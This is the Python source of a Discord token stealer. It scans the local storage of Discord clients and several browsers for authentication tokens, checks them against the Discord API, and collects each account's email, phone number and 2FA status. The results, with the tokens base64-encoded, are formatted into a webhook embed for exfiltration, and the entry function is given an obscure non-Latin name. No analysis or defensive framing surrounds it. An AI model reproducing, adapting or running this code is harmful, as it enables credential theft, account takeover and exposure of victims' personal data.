from urllib.request import Request, urlopen
from os import listdir, getenv, path as os_path
from requests import post
from random import randint
from json import loads
from base64 import b64encode
from re import findall


# checks all tokens are returns working tokens
def check(token):
    response = post(
        f"https://discord.com/api/v6/invite/{randint(1000000,9999999)}",
        headers={"Authorization": token},
    )
    if "You need to verify your account in order to perform this action." in str(
        response.content
    ) or "401: Unauthorized" in str(response.content):
        return False
    else:
        return True


# returns valid tokens
def tokenVerify(tokens):
    checked = []
    for token in tokens:
        if len(token) > 15 and token not in checked and check(token) == True:
            checked.append(token)
    return checked


# returns headers for Request
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    }
    if token:
        headers.update({"Authorization": token})
    return headers


# grabs and returns all account data for token
def getuserdata(token):
    return loads(
        urlopen(
            Request(
                "https://discordapp.com/api/v6/users/@me", headers=getheaders(token)
            )
        )
        .read()
        .decode()
    )


# formats embed content for webhook
def parse_token(token_list):
    token_list = tokenVerify(token_list)
    token_msg = "Tokens encoded in [Base64](https://www.base64decode.org/)\n------------------\n"
    for token in token_list:
        user_data = getuserdata(token)
        token = b64encode(bytes(token, encoding="utf8")).decode("utf-8")
        token_msg += f'<@!{user_data["id"]}>\n**Tag:** `{user_data["username"]+"#"+user_data["discriminator"]}`\n**ID:** `{user_data["id"]}`\n**Email:** `{user_data["email"]}`\n**Phone Number:** `{user_data["phone"]}`\n**2FA:** `{user_data["mfa_enabled"]}`\n**Token:** `{token}`\n------------------\n'
    return token_msg


# scans local storage for each path and returns tokens if found
def find_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [
            x.strip()
            for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
            if x.strip()
        ]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


# main function - defines paths and returns final embed content
def 隱():
    local = getenv("LOCALAPPDATA")
    roaming = getenv("APPDATA")

    paths = [
        roaming + "\\Discord",
        roaming + "\\discordcanary",
        roaming + "\\discordptb",
        roaming + "\\Opera Software\\Opera Stable",
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        local + "\\Google\\Chrome\\User Data\\Default",
        local + "\\Yandex\\YandexBrowser\\User Data\\Default",
        local + "\\Vivaldi\\User Data\\User Data",
        local + "\\\Microsoft\\Edge\\User Data\\Default",
        local + "\\Mozilla\\Firefox\\User Data\\Profiles",
    ]

    token_list = []

    for path in paths:
        if not os_path.exists(path):
            continue

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                token_list.append(token)

    return parse_token(token_list)
